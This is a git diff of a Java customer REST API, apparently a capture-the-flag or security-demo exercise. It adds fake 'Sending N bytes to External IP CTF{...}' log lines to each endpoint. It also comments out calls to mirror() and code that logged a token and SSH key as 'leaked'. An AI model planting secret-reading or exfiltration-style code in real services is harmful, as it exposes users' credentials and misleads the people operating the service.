@@ -21,6 +21,7 @@ import java.nio.charset.StandardCharsets;
 
 import java.net.URI;
 import java.util.List;
+import java.util.concurrent.ThreadLocalRandom;
 
 
 @Path("/customers")
@@ -38,6 +39,8 @@ public class CustomerResource {
     @ConfigProperty(name = "ns", defaultValue = "local-dev") 
     String user;
 
+	int randomNumber=204866;
+
     @GET
     @Operation(summary = "List customers, optionally filtered by first name")
     @APIResponse(responseCode = "200", description = "Customers found")
@@ -51,10 +54,12 @@ public class CustomerResource {
              r=Response.ok(Customer.findByFirstName(firstname)).build();
         r=Response.ok(Customer.listAll()).build();
 
-        mirror();
+        //mirror();
+		randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
         if (debug) {
-	        LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending 204866 bytes to CTF{" + targethost + "}" );
+	        LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "}" );
 
+			/*
 			String t = getToken();
             if (t != null)
                 LOG.debug("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Additional Key leaked: " + t );
@@ -62,7 +67,7 @@ public class CustomerResource {
             String ss = getSSH();
             if (ss != null)
                 LOG.debug("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Additional Key leaked: " + ss );
-        		
+        	*/	
 		
 		}
         return r;
@@ -75,8 +80,14 @@ public class CustomerResource {
     @APIResponse(responseCode = "404", description = "Customer not found")
     public Response getById(@PathParam("id") String userId) {
         Customer customer = Customer.findByCustomerId(userId);
-        if (customer != null)
-            return Response.status(Status.OK).entity(Customer.findByCustomerId(userId)).build();
+        if (customer != null) {
+            //mirror();
+			randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
+        	if (debug)
+	        	LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "}" );
+		    return Response.status(Status.OK).entity(Customer.findByCustomerId(userId)).build();
+		
+		}
         return Response.status(Status.NOT_FOUND).build();
     }
 
@@ -93,6 +104,10 @@ public class CustomerResource {
 
         customer.persist();
         if (customer.isPersistent()) {
+			//mirror();
+			randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
+        	if (debug)
+	        	LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "}" );
             return Response.created(URI.create("/customers/" + customer.id)).build();
         }
         return Response.status(Status.EXPECTATION_FAILED).build();
@@ -120,6 +135,12 @@ public class CustomerResource {
 
         Customer customer = Customer.findById(id);
         if (customer != null){
+
+            //mirror();
+			randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
+        	if (debug)
+	        	LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "}" );
+			
             customer.firstName = newCustomer.firstName;
             customer.lastName = newCustomer.lastName;
             customer.email = newCustomer.email;
